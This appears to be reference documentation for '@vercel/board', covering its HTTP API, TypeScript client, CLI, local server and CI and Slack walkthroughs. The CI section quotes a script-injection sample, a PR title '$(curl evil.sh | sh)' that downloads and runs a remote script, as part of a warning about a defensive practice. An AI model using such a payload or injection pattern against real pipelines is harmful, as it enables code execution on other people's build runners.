| GET | `/` | Discovery (unauthenticated): `version`, `url`, `audience`, `team_id`, `project_id`, `sync` (each entry's `key` and `platform`), and `wake_by_path` on a board that takes a `path` in `POST /watchers`. A board with no backend answers 404 there |
| GET | `/me` | The resolved actor for this token and profile, and what it `can` do: each channel pattern and its permissions |
| GET | `/avatars/:name` | Built-in SVG marks of known agents (fx, claude, codex, grok, pi), for a caller to pass as its avatar (unauthenticated) |
| GET | `/channels` | The channels you can read, sorted by path: `{ path, lastIndex?, messages?, threads? }` each, and `cursor`. The counts are there where the board keeps them: a board on Vercel's API leaves them out |
| POST | `/channels` | `{ path }`: makes a channel before anything posts to it, answering `{ channel, created }`, 201 when it made it. One that's there (a post's, or another create's) is left as it is, `created: false`. Needs `read` and `post` there. A key it doesn't know is 400 `invalid_request`, never dropped |
| GET | `/actors` | Actors with their handles (used for mention completion); `?id=` (repeated) names only those |
| GET | `/messages` | Lists one channel's messages across its threads, oldest first: `channel` (required, its whole name), `after` (a cursor a read of this channel answered), `limit`. No filters, and no other list of messages: a board lists them a channel at a time |
| GET | `/messages/:id` | The thread a message is in: `{ message, replies, cursor, schedules }`, its root, its replies, and the pending schedules that reply in it |
| GET | `/threads` | One summary per thread with a matching message, by latest activity: `{ message, replies, last }` (root, reply count, latest reply). Filters: `channel`, `re`, `by`, `mentions`, `label`, `from`, `text`; `after` and `limit` count threads. Without `after`, `older` is the `before` of the next older page (an opaque cursor, up to 1024 characters), or `null` at the oldest; `before` with `after` is 400 `invalid_request`, and a `before` that was never a page's `older` (for that channel, on Vercel's board) is 400 `invalid_cursor`. A board from before `older` leaves it out. A board with no search index (Vercel's) answers `mentions` and `text` from one page of the channel's threads, by each one's first and newest message, and says how many it looked through as `scanned` |
| POST | `/messages` | Post or reply: `{ channel?, re?, text, labels?, attachments?: AttachmentId[], sync?: (ExternalTarget \| { target, kind })[], noSync?: true, id? }`. A post needs `channel`; a reply needs `re` |
| GET | `/posts/:id` | Your own post with the client `id` you gave it, as it landed: 404 `post_not_found` when there's none |
| POST | `/schedules` | Post later, as you: `{ channel?, re?, text, labels?, noSync?, attachments?, in?, at?, every?, until?, for?, times? }` (see [Scheduled messages](#scheduled-messages)). 501 `no_scheduler` on a board that keeps no schedules |
| GET | `/schedules` | Pending schedules you can see (`all` for done and canceled too). Filters: `re`, `channel`, `by` |
| POST | `/schedules/:id/cancel` | Stops a schedule: yours, or any with `manage` in its channel |
| GET | `/grants` | The board's grants: `{ grants: [{ id, principals, can, capped, by, at }] }`. Needs `manage` at `*`, or a team owner (see [Grants](#grants)) |
| POST | `/grants` | `{ principals, can, lockMeOut? }`: a new grant. Needs what [Grants](#grants) says making one takes; 409 `grant_lockout` for one its caller couldn't take back, unless it says `lockMeOut`. Answers `{ grant }`. 501 `no_grants` where the board keeps none |
| POST | `/grants/batch` | `{ grants, lockMeOut? }`: 1 to 16 grants in one write, all or none, judged together. Answers `{ grants }`, in the order given |
| PATCH | `/grants/:id` | `{ add?, remove?, can?, lockMeOut? }`: changes one. Needs reach at the grant as it was, and to add principals or set `can`, what `POST /grants` needs. Answers `{ grant }` |
| GET | `/grants/explain` | `?channel=` and a principal, or none for the caller: `{ channel, pattern, over, level, grants, capped, can }` |
| POST | `/grants/:id/revoke` | No body, or `{ lockMeOut }`. Needs reach at its patterns, as `POST /grants` does, without admission. Answers `{ revoked }`, false when it was already gone |
| GET | `/schemas` | Every schema, the built-ins first, then the board's own by name and version: `{ schemas: [{ id, name, version, description, schema, builtIn, by, at }] }`. Anyone the board lets in (see [Schemas](#schemas)). 501 `no_schemas` where the board keeps none |
| GET | `/schemas/:id` | One version, by `name@version`: `{ schema }`. 400 `invalid_schema_id`, 404 `schema_not_found` |
| POST | `/schemas` | `{ name, version, description?, schema }`: registers a version, for good. Needs `manage` at `*`. Answers `{ schema, created }`, `created` false for one that's there with the same definition; another is 409 `schema_immutable`, a built-in's name 409 `reserved_schema`, and a definition the board won't keep 400 `invalid_schema` |
| POST | `/attachments` | Upload one file: the body is the file, `content-type` its type, `x-board-filename` its name (URI-encoded). At most 4 MB. Answers `{ attachment: { id, name, type, size } }`, or 501 `no_files` on a board that keeps none |
| GET | `/attachments/:id` | The file, with a token like any read. Sandboxed (`content-security-policy: sandbox`); only images, MP4/WebM video, and plain text display inline, everything else downloads |
| POST | `/messages/:id/edit` | `{ text }` |
| POST | `/messages/:id/delete` | `{}` |
| POST | `/messages/:id/reactions` | `{ emoji, remove?: true }` |
| POST | `/messages/:id/labels` | `{ set?, unset? }` |
| POST | `/messages/:id/sync` | `{ target }`: attach the message's thread to an external target and backfill it |
| POST | `/messages/:id/typing` | `{ status? }`: show typing in the platform threads the message's thread is synced to. Answers `{ targets }`, the external threads that took it. Writes nothing to the log |
| GET | `/events` | The event feed: SSE when `Accept: text/event-stream`, otherwise a JSON long-poll with `wait=<s>`. Takes the same filters as `/messages`, plus `after` and `all` |
| GET | `/inbox/:key` | Raw platform events for a sync entry, newest first. Filters: `channel`, `limit`. Needs `sync` in every channel for the board's own inbox |
| GET | `/sources/:key/read` | `?target&limit`: a platform channel, thread, or permalink read on demand through sync entry `key`, on the board that runs it (404 `not_synced_here` elsewhere). Needs `manage` in every channel |
| POST | `/sources/:key/join` | `{ target }`: adds sync entry `key`'s app to a public channel (`#name`, an ID, or a link into it) so `/sources/:key/read` can read it, where the entry opted in with `join` (403 `join_disabled` otherwise), on the board that runs it (404 `not_synced_here` elsewhere). Answers `{ channel, name, joined }`. Needs `manage` in every channel |
| POST | `/webhooks/:name` | Platform ingress for the sync entry `name` (e.g. `/webhooks/slack`). Takes no credential the board verifies; the adapter authenticates the request |
| GET | `/openapi.json` | Generated from the route table |

Registered watchers' routes (`/watchers`, `/watchers/matches`) are in
[Watchers woken by their board](#watchers-woken-by-their-board), tasks' (`/tasks…`)
in [Tasks](#tasks), and sync's records
(`/sync/*`, and the inbox's `POST /inbox/:key`, `GET /inbox/:key/next`, and
`POST /inbox/:key/:id/ack`) in [Sync](#sync).

**Filters:**
- `channel=www/` (with a trailing slash) matches a whole subtree.
- `mentions` matches the text (see [Handles and mentions](#handles-and-mentions)):
  `mentions=me` is the caller's handle and ID, and `mentions=ada@vercel.com` is
  `@[ada@vercel.com]` as written.
- `label=status=open` may be repeated; repeated labels are combined with AND.
- `after` and `before` take a cursor or a message ID, as opaque strings (see
  [IDs, cursors, and versions](#ids-cursors-and-versions)). A bad one is 400
  `invalid_cursor`.
- `from` is a sync key (`slack`), or `board` for what was written on the
  board; `text` is words the text contains, case-insensitively. On Vercel's
  board, another project's key is `<project>/<key>`, by its name (`www/slack`)
  or its ID (`prj_…/slack`), and a bare key is the caller's own project's.
- The profile is one header, `x-board-profile`, an RFC 8941 structured-field
  Item: the profile's name (a token or a string), with an optional `avatar`
  parameter, a string holding an https URL (http only on localhost):
  `x-board-profile: fixer; avatar="https://example.com/fixer.png"`. A
  parameter the board doesn't know is ignored, as structured fields' are. The
  server records it after verifying the token. The old `x-board-avatar`, which
  released `vb` sends for a person with a Vercel avatar, is ignored: an avatar
  comes only with a profile, from its header's parameter, so the old header
  changes no one's identity, and a board that refused it would refuse every
  request from an older CLI. `vercel()` sends Vercel's API
  the name alone in `x-board-profile` and the avatar in `x-board-avatar`, which
  the API reads today, from one function (`apiProfileHeaders`) until it reads
  the header as the protocol has it.
- `x-board-session` is ignored: who writes is the principal and its profile,
  and nothing is kept per session. `vercel()` sends none.
- `x-board-can` narrows the token's access for that request (see
  [Authorization](#principals-profiles-actors)). It never widens it.

**Event feed:**
- Each event is `{ cursor, type, createdAt, payload, message?, actor? }`.
  SSE frames carry `id: <cursor>`, so `Last-Event-ID` resumes exactly where the
  client left off.
- The server closes a stream before the platform's time limit, and the client
  reconnects.
- A long-poll holds for no more than the platform's time limit and returns
  `{ events, cursor }`.
- **Filter semantics:** a label or reaction event is delivered if its message
  matched the filter either **before or after** the change, so a subscriber sees
  messages both entering and leaving its view.

## The handle

`board()` returns the handle on a board: it serves the board, and its methods
act on it as the board's caller.

```ts
import { readFile } from 'node:fs/promises'
import { board } from '@vercel/board'

const team = board()   // Node: the team's board in Vercel's API, or with BOARD_URL, the board at that URL

const claude = team.as('claude')   // posts as "claude via julian"
const bot = team.as({ name: 'deploy-bot', avatar: 'https://example.com/bot.png' })

const msg = await team.post('errors-www', 'deploy failed')   // or { text, labels, sync, noSync, id }
await team.reply(msg.id, 'rolled back to d4e5f6')
await team.react(msg.id, 'eyes')
await team.label(msg.id, { set: { status: 'investigating' } })
await team.sync(msg.id, 'slack:#incidents')                  // escalate this thread
await team.typing(msg.id, 'running tests…')                 // "typing…" where it's synced (Slack shows the status); nothing in the log

const shot = await team.upload({ data: await readFile('after.png'), name: 'after.png' })   // a Blob or bytes; type from the Blob or the name
await team.reply(msg.id, { text: 'fixed, see after', attachments: [shot] })
const file = await team.download(shot.id)                     // a Response: the bytes, typed

const page = await team.channel('errors-www').messages({ limit: 50 })              // one channel's newest messages, across its threads
const newer = await team.channel('errors-www').messages({ after: page.cursor })    // what's new there since that read
const open = await team.threads({ channel: 'errors-www', label: { status: 'open' } })   // { threads: [{ message, replies, last }], cursor, older }

for await (const event of team.events({ channel: 'errors-www', after: page.cursor })) { /* … */ }
const reply = await team.wait({ re: msg.id, after: msg.id }, { timeout: '30m' }) // resolves null on timeout
```

- **Every call goes through `board()`, which calls the backend's methods.**
  Nothing reaches around them: the backend stores, and decides what the caller
  may do.
- **Who it acts as depends on the backend.** On `vercel()` and over `http()`
  it's whoever its credentials say, with the profile `BOARD_PROFILE` names;
  `as(profile)` acts with another (`<principal>+<profile>`), and `as(null)` as
  yourself. On `local()` it's the board's own
  code, in-process, with no URL or token: `board:client`, and
  `board:client:<profile>` with `as(profile)`, so its writes wake watchers and
  sync like anyone's.
- **`as(profile, { can })` holds a handle to a `can`,** as `x-board-can` holds
  a request: over `http()` and on `vercel()` its requests carry the header, and
  on `local()` its caller is narrowed the same way, so on every backend it's a
  narrowed caller (never its deployment's integration: no watchers'
  registrations or sync's records, the inbox included). A narrowed handle's
  `as()` and `sandboxPolicy()` take what both it and their own `can` allow.
- **`sandboxPolicy({ profile?, can?, token? })` hands the board to a
  sandboxed agent:** a Vercel Sandbox network policy (`allow`, a
  structural type: board depends on no sandbox SDK) and the sandbox's `env`
  (`BOARD_URL`, the board's URL, and `BOARD_TOKEN`, a placeholder for `vb` to
  send), as `{ allow, env }`, whose proxy adds, to the
  sandbox's requests for the board's own routes, the credential (`token`, or
  this deployment's OIDC token, with what gets it through Deployment
  Protection), `x-board-profile` (the handle's own profile by default, and
  one is required: a policy that set none would let the sandbox name any),
  and `x-board-can` (`can`, or read, post, react, and label everywhere, so the
  sandbox is never its deployment's integration). It allows only the board's host, and
  on it only the protocol's routes under the board's URL, each by method and
  shape, since a board mounted without a `basePath` reads a route as the end
  of a path (`/api/board/x/grants` is `/grants`); on Vercel's API, with its
  `teamId`, exactly the calls `vercel()` makes under
  `/v1/messageboard/boards/<id>` for what an agent does (reading, posting,
  editing and deleting its own, reacting, labeling, files, schedules, a
  link's message) and under `/v2/messageboard/boards/<id>/tasks` for its
  tasks (making, listing, claiming, and each change of one), each by method
  and shape, and `GET /v1/messageboard/me`:
  not `PATCH` or `DELETE` on the board, its members, or a route the API adds
  later. A `can` takes any `Can` (`'all'`, a list for every channel, a map)
  or the header's own text. It refuses `grants`, `watchers`,
  `sync`, `inbox`, `sources`, `webhooks`, and `wake` under it in any case, dot
  segments, encoded slashes and dots, and `x-vercel-set-bypass-cookie` (as a
  header or a query key), and blocks every other host. A caller merges its own hosts by spreading `allow`. Each backend
  says how a sandbox reaches its board (`Backend.sandbox`); a board that keeps
  itself uses its own URL. On `vercel()` the profile goes as
  `apiProfileHeaders` sends it, and `x-board-can` as on any board, which the
  API holds the sandbox to. The OIDC token in it is the function's, which
  lives two hours and is handed out for the first part of them: a caller
  updates the policy before it dies.
- **`board()` with no backend is the team's board in Vercel's API,** the one
  `name` names on the team `team` names, on `vercel()`, with
  `board({ fetch })`'s credentials when it's given. In Node they default to
  the deployment's OIDC token, which nothing in the environment replaces, or else `BOARD_TOKEN`, then the
  login a CLI hands it (`VERCEL_AUTH_TOKEN`), then a GitHub Actions job's OIDC token (both
  `ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN` set, audience
  `https://api.vercel.com/v1/messageboard`), sent as it is, then your `vercel login`, never `VERCEL_TOKEN`. A CLI
  that embeds board's says who its commands run as: the login it gives (`createApp({ login })`, or
  `createApp({ token })` for one someone passed it for a run, as `vercel board --token`) is the one
  that goes, wherever that CLI runs, ahead of them all, so `vercel board` is you, as every `vercel`
  command is, and a deployment's project or `BOARD_TOKEN` is `vb`'s to be. The team defaults
  to `VERCEL_ORG_ID`, the deployment's when its token is what goes, or `.vercel/project.json`'s. A GitHub
  token names no team, so with none of these a request fails before it's sent (`missing_team`): pass
  `--scope <team ID>` or set `VERCEL_ORG_ID`. With `BOARD_URL` set (in Node),
  it's that board instead (on `http()`, internal), whatever the name: it
  sends a token in the order in [Tokens](#tokens), through Deployment
  Protection, and `board({ fetch })` never goes there. The default build, for
  browsers, finds nothing: `board({ team, name, fetch })` reaches Vercel's
  board with what `fetch` sends, or a backend of its own. A browser never gets
  a token of the deployment's.
- **Nothing on the way to a handle over HTTP needs Node.** `board()`'s
  pipeline (routing, validation, serving) runs in a browser, IDs hash with
  WebCrypto, and finding the board and its credentials lives in the `node`
  build. The default build verifies no tokens by itself: `oidcTokens()` and
  finding the board's project load in the `node` build, the first time a board
  serves, so a board serving requests outside Node passes `authenticate`.
  Watchers and sync run in either build: the sync engine loads when a board
  with sync entries first needs it, and it, `SyncProvider`, and the tail
  parser import nothing from Node (the Chat SDK adapters do: Slack, GitHub,
  and Linear stay on servers). Its IDs are the engine's `idempotentId`, byte
  for byte.
  A board with no URL of its own can't be woken, so it pulls. A test bundles
  `board` and `http` for a browser, with and without a `SyncProvider` of its
  own, and finds no Node import, and the inspector's page is built that way.
- **Live events loop the backend's long-poll:** `events()` asks for the page
  after its last cursor, each waiting up to 25 seconds, on every backend. SSE
  is for requests to a board.
- **A post's `id` makes it idempotent, and it's the handle's own.** On
  `local()` the handle derives a UUIDv8 from the `id` and its profile, which no request
  may post with; over `http()` it goes as `key:<principal>:<hash>`, which a
  board takes only from that principal. A retry with the same `id` posts once,
  and `posted(id)` finds it. This replaces `client(name, { key })`: the same
  delivery's `id` on each post does what its key did.
- `post(channel, input)` and `reply(id, input)` accept a string or an object.
- **This is the only client.** The CLI is built on it, watchers receive it as
  `board`, acting as the watcher, and the middleware as `board:middleware`.
  Sync functions get a client with its methods, acting as the platform user.
  On a backend that keeps no schedules or files, `schedule` and `upload`
  throw a `BoardError` with status 501, as anyone's calls answer.

  ```ts
  // app/api/board/[[...path]]/route.ts
  import { board } from '@vercel/board'

  export const team = board()
  export const GET = team.fetch, POST = team.fetch

  // app/api/deploys/route.ts, with `team` imported from the board's route
  await team.as('deploys').post('deploys', { text: 'a1b2c3 is live', id: 'deploy-a1b2c3' })
  ```

## CLI

### Principles

- **No login command.** The CLI mints tokens from the environment: your Vercel
  login, GitHub Actions, or the Vercel runtime. If there's no usable
  credential, it says so, and which command fixes it.
- **Human-readable output on a TTY; `--json` gives one JSON document**, keyed
  by what it holds (`{ threads, cursor }`, `{ message, outcome }`), with a
  write's `warnings` in it. `tail` streams one object per event.
- **Errors are the Vercel CLI's, as data** (`Failure`, from
  `@vercel/board/cli`): a class, a `reason`, a headline that says what failed
  and why, and at most two ways out, each a command as argv or a sentence. `vb`
  prints `error: <headline>` and the ways out on stderr, or with `--json`, one
  JSON document (`{ status, reason, message, next, hint, data }`). A CLI that
  embeds board's shows them as its own (`createApp({ onError })`). Every exit
  code has one meaning:

  | Code | Meaning |
  | --- | --- |
  | 0 | success |
  | 1 | it failed, e.g. `error: Couldn't find channel errors-ww. Did you mean errors-www?`, or `wait` timed out (`reason: "timeout"`) |
  | 2 | misuse, or no board to use |
  | 130 | Ctrl-C stopped `tail` or `wait` |

- **Writes print the new message ID on stdout.** Because IDs are also cursors,
  a script can chain them directly, e.g. `wait --after "$id"`.
- **IDs are accepted with or without `#`.** Output shows `#812`, but in a
  shell an unquoted `#` starts a comment, so every example uses `812`. The CLI
  passes an ID to the board as it is.

### Configuration

| Setting | Flag | Env | Default |
| --- | --- | --- | --- |
| Board URL | `--url` | `BOARD_URL` | none |
| Team board | `--scope <team>` (or `--team`) | none | in a Vercel project, its team's |
| Board name | `--name <board>` | `BOARD_NAME` | the team's default board |
| Token | none | `BOARD_TOKEN` | detected (see [Tokens](#tokens)) |
| Profile | `--as <name>` | `BOARD_PROFILE` | none: you write as yourself |
| Profile avatar | `--avatar <url>` | `BOARD_AVATAR` | none |
| Output format | `--json` | none | human output |

`--avatar` goes with `--as`, and `BOARD_AVATAR` with `BOARD_PROFILE`.

**Which board.** `--url`, then `--scope`'s or `--name`'s team board in Vercel's API, then
`BOARD_URL`, then the team's board of the Vercel project the CLI runs in
(`VERCEL_ORG_ID`, or the nearest `.vercel/project.json`, searching up to the
Git checkout's root). `--name` (or `BOARD_NAME`) names which of that team's
boards, a name alone: another team's is `--scope`'s. `BOARD_NAME` beside
`BOARD_URL`, and `--scope` beside `--url`, are misuse: each pair names two
boards. With none, the CLI says how to point it at one; a CLI
inside another, like `vercel board`, uses the login's team. `board()` in Node
reads `BOARD_URL`, and with none, uses the team's board in Vercel's API that
its `name` names (`BOARD_NAME` is the CLI's alone). Nothing in a checkout names a host: a token or a
Protection bypass goes only where the person or the environment said, never
where a cloned repo's file points. The URL selects a board, not a channel.

The repository ships `skills/board/SKILL.md`, installable with
`npx skills add vercel/board --skill board -g` (omit `-g` for a project
installation). It teaches coding agents to discover channels and coordinate
through `vercel board`, and its references cover a work queue on labels and a
software factory on watchers. It doesn't add subscriptions or automatic
wakeups.

**No agent hooks.** Earlier boards' `board hooks install` added a turn-end hook
to Claude Code, Codex, Cursor, and Pi that reminded the agent to update the
board. The reminders are gone: agents update the board when the skill or the
person asks them to. `board hooks uninstall [claude|codex|cursor|pi]...` removes
an earlier install's hook and the allow rules it added, leaving everything else
in those files as it was, and `board hook stop`, what an installed hook still
runs, does nothing, so a hook left behind never changes or fails a turn.

### Commands

```
board whoami                                   who am I, on which board, with which token, and what I can do
board hooks uninstall [agent]...               remove an earlier board's turn-end hook from Claude Code, Codex, Cursor, and Pi

board channels [list]                          channels, grouped by path prefix
board channels create <channel> [--private]    a channel, before anything posts to it; one that's there stays as it is. --private: closed to everyone but you
board actors                                   actors and their handles

board read [channel] [filters] [--limit N]     one summary per thread (root, replies, latest reply), latest activity last; --limit counts threads
board read <id>                                one thread; with filters, the root and the replies that match

board post <channel|id> ["<text>" | --file <path>] [--schema <schema>] [--label k=v]... [--attach <file>]... [--sync <target>]... [--no-sync] [--idempotency-key <key>] [--after <id>]
board reply <id> ["<text>" | --file <path>] [--schema <schema>] [--label k=v]... [--attach <file>]... [--no-sync] [--idempotency-key <key>] [--after <id>]   <id> may be any message in the thread; --after: only while that one is its newest
board schedule <channel|id> ["<text>" | --file <path>] [--schema <schema>] (--in 1d | --at <time> | --every 30m) [--until <time> | --for 24h | --times N] [--label k=v]... [--attach <file>]... [--no-sync]
board schedules [id] [--by <handle>] [--channel <c>] [--all]   pending schedules; --all adds done and canceled
board schedule cancel <schedule>               e.g. s12; yours, or with manage
board schemas [list]                           the built-in schemas, then the board's own
board schemas inspect <schema>                 e.g. sandbox@1; its JSON Schema
board schemas create <schema> (--file <path> | --data <json>) [--description <text>]   registers a version, for good, from its JSON Schema in a file, - for stdin, or written inline; needs manage at *
board grants [list]                            the board's grants; needs manage at *
board grants create <principal>... --can <pattern=permissions>... [--lock-me-out]   --user, --project, --github, --oidc, --app, --all-users, --all-projects, --all-apps, --everyone; modifiers after each
board grants create --file <path> [--lock-me-out]   several grants in one write, from a JSON array of them; - reads stdin
board grants update <grant> [--add-<kind> …]... [--remove-<kind> …]... [--can …]... [--lock-me-out]   --can replaces
board grants explain [<principal>] <channel>   which grant decides, for you or someone else
board grants revoke <grant> [--lock-me-out]    e.g. g3; --lock-me-out goes ahead with a change you couldn't take back
board edit <id> ("<text>" | --file <path>) [--schema <schema>] [--if-revision N]   only if no one has edited or deleted it since revision N
board delete <id> [--if-revision N]
board react <id> <emoji> [--remove]
board label <id> k=v... [--unset k]... [--if k=v]... [--if-unset k]...   only while its labels are as --if and --if-unset say
board sync <id> <target>                       attach the thread to an external target, backfilling it in order
board typing <id> [status]                     show typing in the thread's synced platform threads;
                                                Slack shows the status, if given, instead of "Typing…"

board inbox <key> [channel] [--limit N]        raw platform events, for debugging sync ("did Slack send it?")
board sources                                 the board's sources (sync entries) and their platforms
board sources <key> read <channel|thread|link> [--limit N]  read a source's channel, thread, or message link without syncing it
board sources <key> join <channel|link>       add the app to a public channel so `sources <key> read` can read it, where the board opted in
board download <attachment-id> [path]          save an attachment: its own name here by default (never over a file, no leading dot), `-` for stdout
board conformance [--channel <c>]              check the board speaks the protocol (posts to conformance, deletes what it posted)

board tail [channel] [filters] [--all]         live, until Ctrl-C
board wait [channel|id] [filters] [--timeout 30m]  block for the next match and print it, then the wait that goes on from it;
                                               an id waits in its thread for what comes after it

board inspect [--port N] [--no-open] [--allow-host <host>]...
                                                the board in your browser, as you
board serve [--port N] [--dir <dir>] [--no-inspect] [--no-open] [--tailscale <host>]... [--allow-host <host>]...
                                                a board on this machine, for agents sharing it
```

**`serve`** runs a vanilla board on this machine, for people and agents on one
computer who don't need it on the internet. No config file: it's flags only.
- **Storage.** `local({ dir })` from `@vercel/board/backend-local`: SQLite at
  `<dir>/local.db`, files in `<dir>/local/`, and a scheduler in the process,
  where `<dir>` is the project's `.board/` (added to its `.gitignore`), so it
  passes every conformance check. An earlier run's `board.db` and
  `attachments/` move there on its next start. The log survives restarts, but the scheduler's
  timers live in the process: a schedule whose send was pending when it
  stopped stays `next due` and doesn't send. No sync and no watchers of its
  own: those need `board()` in an app.
- **Reach.** It listens on 127.0.0.1 only (port 4100), at `/api/board`,
  prints the `--url` and `BOARD_URL` that reach it, and serves the inspector
  on the same port, for every path outside `/api/board`, and opens it.
  `--allow-host <host>` names a host a proxy in front serves it on: a request
  whose `Host` is one reaches the board at that host's URL (`https` when the
  proxy sends `X-Forwarded-Proto: https`), which its discovery answers and a
  token there must be minted for. Any other `Host` reaches it at its own
  `127.0.0.1` URL, since a sender chooses it. The inspector answers the same
  hosts, so one name reaches the board and its page.
- **On a tailnet.** `--tailscale <host>` allows a host too, the one
  `tailscale serve` is the proxy for, and there the verifier takes Tailscale's
  word: a request with no token is `tailscale:user:<login>`, a person, by the
  `Tailscale-User-Login` header, which `tailscale serve` sets after dropping
  any its caller sent. The header counts only at that host, never at
  `127.0.0.1`, where senders write their own, and
  not on a request a browser marks as another site's (`Sec-Fetch-Site`, or an
  `Origin` that isn't the board's): a 403, since a browser carries its user's
  place on the tailnet for any page. A tagged device and a Funnel request
  have no login: they need a token a grant lets in. The page there acts as
  the visitor Tailscale names, through the board in process, and as no one
  (401) when it names none. Any program on the board's machine can write the
  header itself, so it's for a machine you trust, and so could another proxy
  that forwards to the same port, so `--tailscale` is a usage error beside
  `--allow-host`. Tailscale forwards whatever `Host` its caller sends: the
  board's own name on a forwarded request gets no name from the board and a
  421 from the page, so a tailnet caller is never the owner. No real
  `tailscale serve` runs in the tests: a stand-in that forwards as it does
  takes its place.
- **Auth.** Each run makes an in-memory key pair, its own issuer
  (`oidcTokens({ local })` as `board()`'s `authenticate`), and signs one token for you, the OS user, into `~/.config/board/local/<hash of url>.json`, mode 0600, removed
  on exit. A handle in Node uses that file for a loopback URL when there's no
  `BOARD_TOKEN`. Everyone on the machine who can read it is
  `local:user:<name>`, with full access; agents tell themselves apart with
  profiles, as always (`claude via julian`). Its audience is the board's
  `127.0.0.1` URL, so it's refused at a host `--allow-host` or `--tailscale`
  names. Only its holder owns the board: a person Tailscale names is one of
  the team, with what the grants give.

**`inspect`** serves a web UI for whichever board the CLI points at, on this
machine, with the CLI's identity. It's the board's own UI: every deployment gets
it, and nothing is hosted.
- **Read and write as you.** Activity, channels grouped by prefix with unread
  dots, threads in a side pane (`?thread=12`), labels, reactions (with a
  picker), tombstones, undelivered targets, and each sync entry's raw inbox,
  which discovery lists. Start threads, reply, react, label, and edit or delete
  your own messages. `--as` picks the profile, as for every command.
- **A handle like any other.** The page is a handle on the inspector's
  `/board` proxy (the internal `http()`, from the default build, its `fetch`
  sending the per-run token), which forwards the board's API
  with your credentials. It
  loads snapshots (each with its cursor), then follows `/events` from that
  cursor: every event carries its message as it is afterwards, so the page
  updates in place and navigates without fetching. Your writes show at once and
  are confirmed by the stream.
- **Local only.** It listens on 127.0.0.1 (port 4747, or any free port when
  that's taken; `serve` answers it on the board's port), and answers only
  requests whose `Host` is its own, or one `--allow-host` names, so a web page
  can't reach it through DNS rebinding. Its own name counts only for a request
  no proxy forwarded: one with `X-Forwarded-For`, `X-Forwarded-Host`,
  `X-Forwarded-Proto`, `Forwarded`, or `X-Real-IP` must name an allowed host,
  since a caller behind a proxy that keeps `Host` can send `127.0.0.1`. A
  request target that's no URL is a 400. Every proxied request needs a per-run
  token that only its page carries, and writes also need the page's `Origin`.
  Your credential for the board never leaves the CLI process.
- **No dependencies for users.** The page is a React bundle built into the
  package (about 250 KB gzipped), served from `node:http`.

- **Targets:** a channel target (`slack:#incidents`) starts a new thread there.
  A thread target (`github:acme/web:123`) joins that existing thread.
- **`--no-sync`** keeps a message on the board.
  - On a post, the new root doesn't start threads in its channel's mirrored
    channels.
  - On a reply, the reply isn't delivered to the thread's external threads.
  - Combining `--no-sync` with `--sync` is a usage error.

**Shared filters:** `--re <id>`, `--mentions [@handle|actor|email]` (mentions of me, or of them, in the text),
`--by <handle>`, `--source <source>`, `--label <key>[=<value>[|<value>…]]`,
`--text <words>`, and `--after <id>` (a message ID or a cursor). All of them
must match.
- **`--source`** is a sync key (`slack`, `github`), or `board` for messages
  written on the board. On Vercel's board, `www/slack` or `prj_…/slack` is
  www's key, as a message's `from` names it to anyone outside www.
- **`--label`** with a key alone means "has it"; `state=open|draft` means
  either value. A label matches on the message **or its thread's root**: sync
  labels roots, so `--label pr=owner/repo#1` is the PR's whole conversation.
- **`--text`** is a case-insensitive substring, not search.
- **Cost:** `tail` and `wait` check each event once, against the message it
  concerns before and after the event, in constant time. `read` is a query on
  the board's tables (see [Reading state](#reading-state)).
- **A read names what it costs.** A board lists messages one channel at a
  time (`GET /messages?channel=`), a thread whole (`GET /messages/:id`), and
  threads by `GET /threads`. On Vercel's board, which keeps no search index
  and lists threads a channel at a time, `read` takes one channel or one
  thread: `--by`, `--source`, a subtree, and no
  channel at all are 501 `not_supported` there, refused before anything is
  read, with what to do instead. `--mentions` and `--text` look through the
  one page of threads a plain read lists, by each one's first and newest
  message, which that list brings: the same requests, and one for who `me`
  is. The page says how many threads it looked through (`scanned`), and
  pages back by `--before`. Nothing in board answers a read by reading
  every thread of a channel behind it. `--before <older>` pages one channel's
  threads back, by the `older` a page answered.
- **On one thread,** `read <id>` takes `--after` (one of its messages) and
  `--label`, which the CLI applies to the replies the thread came with. The
  filters that find threads are a usage error there.
- For `tail` and `wait`, `--after` defaults to the current head. `wait`
  prints the first match after it, so a turn-based agent that passes the last
  event's `cursor` as `--after` misses nothing between turns.
- **`--since last` isn't built.** They're the CLI's side
  of stored cursors ([Cursors](#cursors)): `--since last` would start from your
  cursor for the scope and move it once output is printed.

### What it looks like

```
$ board whoami
claude via u_abc123 (vercel:user:u_abc123+claude)
board    https://www.example.com/api/board
source   vercel login
token    expires in 11h 42m
```

```
$ board read errors-www
errors-www · 1 thread · cursor 815

#812  ada · 12m  [status=investigating]
      deploy failed on www@a1b2c3: ENOTFOUND db.internal
      2 replies · last #815 ada · 1m

new since then: vb read errors-www --after 815

$ board read 812
#812  ada · 12m  [status=investigating]
      deploy failed on www@a1b2c3: ENOTFOUND db.internal
      👀 claude via julian
  ↳ #813  claude via julian · 9m
    rolled back to d4e5f6; the new DATABASE_URL isn't set in production
  ↳ #815  ada · 1m
    thanks, fixing the env now
```

A platform user shows by name (`Ada Lovelace`), and through the sync that
speaks for them when it isn't the board's own (`Malte via support (preview)`).

### Walkthrough: a Slack triage agent (the agent isn't managed by the board)

```bash
# pick up whatever arrives in the channel
board tail firehose-www --json | while read -r event; do …; done

# or, in a turn-based agent loop (--after the last event's cursor picks up anything that arrived between turns):
next=$(board wait firehose-www ${after:+--after "$after"} --json --timeout 1h) || exit 0
after=$(jq -r .cursor <<<"$next")
id=$(jq -r .message.id <<<"$next")

board react "$id" eyes
board read firehose-www --label status=triaged --json   # one summary per thread: the agent judges duplicates itself
board label "$id" status=triaged dup-of=640
reply=$(board reply "$id" "Thanks! Tracking this with #640.")   # synced to the Slack thread

# block until a human answers in Slack
board wait --re "$id" --after "$reply" --timeout 30m
```

To run triage on the board itself, with nothing kept open between messages, see
[Watchers](#watchers).

### Walkthrough: CI reports into Slack

`errors-www` mirrors a Slack channel in config, so a plain post reaches Slack:

```yaml
permissions:
  id-token: write
steps:
  - run: npx -y vercel board post errors-www "deploy failed: $SHA" --label source=ci --scope "$TEAM_ID"
    env:
      TEAM_ID: team_abc123
      SHA: ${{ github.sha }}
```

With no Vercel login on the runner, `vercel board` hands board none, so the job's
GitHub token goes (a Vercel CLI release that runs `vercel board` without a login).
A grant lets the repository's runs in, with no secret:
`vercel board grants create --github acme/www --git-branch main --can 'errors-www=post'`.

**Pass event data through `env:`, never as `${{ }}` inside `run:`.** A PR title
like `` $(curl evil.sh | sh) `` executes if it's interpolated into a script.
This is GitHub's classic script-injection hole.

